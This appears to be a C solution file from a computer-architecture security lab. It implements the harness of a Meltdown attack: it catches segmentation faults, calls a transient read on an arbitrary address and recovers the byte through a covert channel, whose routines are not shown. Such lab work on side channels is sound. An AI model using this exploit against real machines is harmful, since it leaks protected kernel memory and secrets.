#include <signal.h>
#include <setjmp.h>
#include <string.h>

#include "solution.h"

static sigjmp_buf g_jmpbuf;
static volatile sig_atomic_t g_handler_installed = 0;

static void fault_handler(int sig, siginfo_t *si, void *context) {
    (void)sig;
    (void)si;
    (void)context;
    siglongjmp(g_jmpbuf, 1);
}

static void ensure_handler_installed(void) {
    if (g_handler_installed) {
        return;
    }

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;

    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    g_handler_installed = 1;
}

int do_meltdown(uintptr_t adrs) {
    ensure_handler_installed();
    cc_init();

    if (sigsetjmp(g_jmpbuf, 1) == 0) {
        meltdown(adrs);
    }

    return cc_receive();
}
